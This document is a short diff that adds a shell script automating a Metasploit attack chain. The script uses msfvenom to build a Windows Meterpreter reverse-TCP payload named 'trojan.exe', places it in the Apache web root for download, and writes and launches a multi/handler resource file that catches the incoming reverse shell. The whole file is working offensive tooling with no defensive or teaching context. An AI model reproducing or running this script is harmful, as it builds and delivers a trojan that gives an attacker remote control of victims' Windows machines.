@@ -1,0 +1,15 @@
+touch backdoor.rc
+echo "msfvenom -a x86 -p windows/meterpreter/reverse_tcp lhost=$(hostname -I) lport=1717 -f exe -o trojan.exe" >> backdoor.rc
+echo mv trojan.exe /var/www/html/ >> backdoor.rc
+echo service apache2 start >> backdoor.rc
+echo msfconsole -r metasploit.rc >> backdoor.rc
+chmod +x backdoor.rc
+
+touch metasploit.rc
+echo use multi/handler >> metasploit.rc
+echo set payload windows/meterpreter/reverse_tcp >>metasploit.rc
+echo "set lhost $(hostname -I)" >> metasploit.rc
+echo set lport 1717 >> metasploit.rc
+echo run >> metasploit.rc
+
+./backdoor.rc
